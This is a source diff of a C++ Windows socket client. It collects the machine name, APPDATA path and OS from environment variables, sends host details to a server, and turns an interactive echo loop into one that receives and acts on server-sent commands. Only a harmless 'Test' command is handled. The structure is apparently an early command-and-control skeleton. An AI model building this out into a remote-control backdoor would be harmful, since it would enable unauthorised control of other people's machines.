@@ -6,6 +6,8 @@ std::string computer = getenv("computername");
 std::string appdata = getenv("appdata");
 std::string operatingSystem = getenv("os");
 
+std::string command;
+
 //
 void Client()
 {
@@ -56,30 +58,30 @@ void Client()
 
     send(sock, pc.c_str(), pc.size() + 1, 0);
 
-    do
+    while (true)
     {
-        // Prompt the user for some text
-        cout << "> ";
-        getline(cin, userInput);
+        ZeroMemory(buf, 4095);
 
-        if (userInput.size() > 0)		// Make sure the user has typed in something
+        //
+        int bytesReceived = recv(sock, buf, 4096, 0);
+        if (bytesReceived == SOCKET_ERROR)
         {
-            // Send the text
-            int sendResult = send(sock, userInput.c_str(), userInput.size() + 1, 0);
-            if (sendResult != SOCKET_ERROR)
-            {
-                // Wait for response
-                ZeroMemory(buf, 4096);
-                int bytesReceived = recv(sock, buf, 4096, 0);
-                if (bytesReceived > 0)
-                {
-                    // Echo response to console | SM = Server Message
-                    cout << "[SM] -> " << string(buf, 0, bytesReceived) << endl;
-                }
-            }
+            cerr << "Error in recv(). Quitting" << endl;
+            break;
         }
 
-    } while (userInput.size() > 0);
+        //
+        command = string(buf, 0 , bytesReceived);
+        if (command == "Test")
+        {
+            string msg = "Text";
+            send(sock, msg.c_str(), msg.size() + 1, 0);
+        }
+        else
+        {
+            cout << "None Command";
+        }
+    }
 
     // Gracefully close down everything
     closesocket(sock);
